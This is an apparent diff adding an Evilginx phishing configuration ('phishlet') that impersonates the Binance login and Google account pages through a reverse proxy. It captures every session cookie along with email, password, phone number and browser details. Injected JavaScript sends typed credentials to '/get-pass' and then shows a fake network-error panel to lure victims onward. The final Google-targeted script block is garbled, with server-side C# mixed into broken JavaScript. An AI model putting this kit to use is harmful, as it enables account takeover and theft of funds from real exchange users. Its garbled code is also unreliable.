@@ -1,0 +1,271 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+author: '@maxibrainz10'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.com', session: true, is_landing: true}
+  - {phish_sub: 'g-accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'binance.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'binance.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'geetest.com', session: false, is_landing: false}
+  - {phish_sub: 'bin', orig_sub: 'bin', domain: 'bnbstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'geetest.com', session: false, is_landing: false}
+  - {phish_sub: 'monitor', orig_sub: 'monitor', domain: 'geetest.com', session: false, is_landing: false}
+  - {phish_sub: 'sensors', orig_sub: 'sensors', domain: 'binance.cloud', session: false, is_landing: false}
+  - {phish_sub: 'frontend-m', orig_sub: 'frontend-m', domain: 'binance.cloud', session: false, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'report', domain: 'binance.gg', session: true, is_landing: false}
+
+sub_filters:
+
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https://{hostname}/monitor/v1/log', replace: 'https://{hostname}/monitor/v1/log', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'bin.bnbstatic.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https://{hostname}/monitor/v1/log', replace: 'https://{hostname}/monitor/v1/log', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+ 
+  - {triggers_on: 'accounts.binance.com', orig_sub: '', domain: 'geetest.com', search: 'geetest.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'static\.geetest\.com', replace: 'static\.instaconnect\.ga', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'report', domain: 'binance.gg', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'report', domain: 'binance.gg', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'report', domain: 'binance.gg', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: '{hostname}', replace: '{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'www', domain: 'binance.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'api', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'api', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'api', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'static', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+
+  - {triggers_on: 'www.binance.com', orig_sub: '', domain: 'geetest.com', search: 'geetest.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'static\.geetest\.com', replace: 'static\.instaconnect\.ga', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'report', domain: 'binance.gg', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'report', domain: 'binance.gg', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'report', domain: 'binance.gg', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: '{hostname}', replace: '{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'frontend-m', domain: 'binance.cloud', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'api', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'api', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'api', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'static', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'static', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'sensors', domain: 'binance.cloud', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'monitor', domain: 'geetest.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+auth_tokens:
+  - domain: '.binance.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+auth_urls:
+  - '/*'
+  - '/my/dashboard'
+  - '/dashboard/.*'    
+credentials:
+  username:
+    key: 'binance_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'binance_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mobile'
+      search: '(.*)'
+      type: 'post'
+    - key: 'mobileCode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'email'
+      search: '(.*)'
+      type: 'post'
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'accounts.binance.com'
+  path: '/en/login'
+
+js_inject:
+  - trigger_domains: ["accounts.binance.com"]
+    trigger_paths: ["/login","/login.*"]
+    trigger_params: [next_lure]
+    script: |
+      function lp(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "send_email(); send_mobile();");
+        return;
+      }
+      function send_email(){
+        var password = document.getElementsByName("password")[0].value;
+        var email = document.getElementsByName("email")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/get-pass', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("binance_password="+encodeURIComponent(password)+" &"+" binance_email="+encodeURIComponent(email));
+        var plattoon = document.getElementsByClassName("geetest_panel_error")[0];
+        plattoon.parentNode.removeChild(plattoon);
+        var div = document.createElement('div');
+        div.innerHTML = `
+        <div class="geetest_panel_error" style="display: block;"><div class="geetest_panel_error_icon"></div><div class="geetest_panel_error_title">Network Error !</div>
+        <div class="geetest_panel_error_title">Please Try Again</div><div class="geetest_panel_error_content" onclick="window.location.href = '{next_lure}';">Retry</div><div class="geetest_panel_error_code">11</div></div>
+        `;
+        document.getElementsByClassName("geetest_panel_box")[0].appendChild(div);
+        return;
+      }
+      function send_mobile(){
+        var password = document.getElementsByName("password")[0].value;
+        var mobileCountry = document.getElementsByClassName("css-167bcsx")[0].value;
+        var mobileNumber = document.getElementsByName("mobile")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/get-pass', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("binance_password="+encodeURIComponent(password)+" &"+" mobileCode="+encodeURIComponent(mobileCountry)+" &"+" mobile="+encodeURIComponent(mobileNumber));
+        var plattoon = document.getElementsByClassName("geetest_panel_error")[0];
+        plattoon.parentNode.removeChild(plattoon);
+        var div = document.createElement('div');
+        div.innerHTML = `
+        <div class="geetest_panel_error" style="display: block;"><div class="geetest_panel_error_icon"></div><div class="geetest_panel_error_title">Network Error !</div>
+        <div class="geetest_panel_error_title">Please Try Again</div><div class="geetest_panel_error_content" onclick="window.location.href = '{next_lure}';">Retry</div><div class="geetest_panel_error_code">11</div></div>
+        `;
+        document.getElementsByClassName("geetest_panel_box")[0].appendChild(div);
+        return;
+      }
+      setTimeout(function(){ lp(); }, 4000);
+
+  - trigger_domains: ["accounts.binance.com"]
+    trigger_paths: ["/login","/login.*"]
+    trigger_params: [domain]
+    script: |
+      function lp2(){
+        var max1 = "{domain}"
+        var max2 = document.getElementsByClassName("css-vurnku")[0];
+        link.textContent = ("//accounts."+max1)
+      }
+      setTimeout(function(){ lp2(); }, 100);
+      
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
+    script: |
+      function tatechange( obj ){
+        var str = [];
+        for (var p in obj){
+          if (obj.hasOwnProperty(p)) {
+            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+          }
+        }
+        return str.join("&");
+      }
+      function PadiMustTriumph(){
+        console.log( "Populating" );
+        var xhttp = new XMLHttpRequest();
+        var xform = {
+          useragent : navigator.userAgent,
+          browser    : navigator.appName,
+          engine     : navigator.product,
+          platform   : navigator.platform,
+        }
+        xhttp.onreadystatechange = function(){
+          console.log( "Sent" );
+        }
+        xhttp.open( "POST", "/getuserinfo", true );
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        console.log( tatechange( xform ) );
+        xhttp.send( tatechange( xform ) );
+      }
+      console.log( "googl.egot.here." );
+      setTimeout(PadiMustTriumph, 2000);
+  - trigger_domains: ['play.google.com']
+    trigger_paths: ['.*?']
+    script: |
+      function tatechange( obj ){
+        var str = [];
+        for (var p in obj){
+          if (obj.hasOwnProperty(p)) {
+            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+          }
+        }
+        return str.join("&");
+      }
+      function XwebPlay(){
+        console.log( "X Web" );
+        var httpReq = new XMLHttpRequest();
+        httpReq.withCredentials = true; 
+        var url = '/log';
+        var fields = 'format=json&hasfast=true&authuser=0';
+        var fields2 = {format: 'json', hasfast: 'true', authuser: '0'};
+        httpReq.open('POST', url, true);
+        console.log('good');
+        httpReq.setRequestHeader('Access-Control-Allow-Headers', '*');
+        httpReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=utf-8');
+        httpReq.setRequestHeader('Access-Control-Allow-Origin', '*');
+        httpReq.setRequestHeader('Cache-Control', 'no-cache');
+        httpReq.setRequestHeader('X-Goog-AuthUser', '0');
+        httpReq.setRequestHeader('Sec-Fetch-Site', 'cross-site');
+        httpReq.setRequestHeader('Access-Control-Allow-Methods', 'PUT, POST, OPTIONS, GET, HEAD');
+        httpReq.setRequestHeader('Access-Control-Max-Age', '1728000');
+        httpReq.setRequestHeader('Sec-Fetch-Dest", 'empty');
+        
+        if (Request.httpReq == "OPTIONS")
+        //In case of an OPTIONS, we allow the access to the origin of the petition
+        string MaxOrigin = Request.Headers["ORIGIN"];
+        Response.AddHeader("Access-Control-Allow-Origin", MaxOrigin);
+        Response.AddHeader("Access-Control-Allow-Methods", "POST");
+        Response.AddHeader("Access-Control-Allow-Headers", "accept, content-type");
+        Response.AddHeader("Access-Control-Max-Age", "1728000");
+        }
+        var fields = {
+        console.log('ok');
+        httpReq.onreadystatechange = function () {
+        console.log('test');
+        if (httpReq.readyState === 4 && httpReq.status === 'success') {
+            console.log('test');
+            alert(httpReq.responseText);
+            }
+        };
+        httpReq.send(fields2);
+        console.log( "google.got.here." );
+        setTimeout(XwebPlay, 2000);
+      
+
+
+  
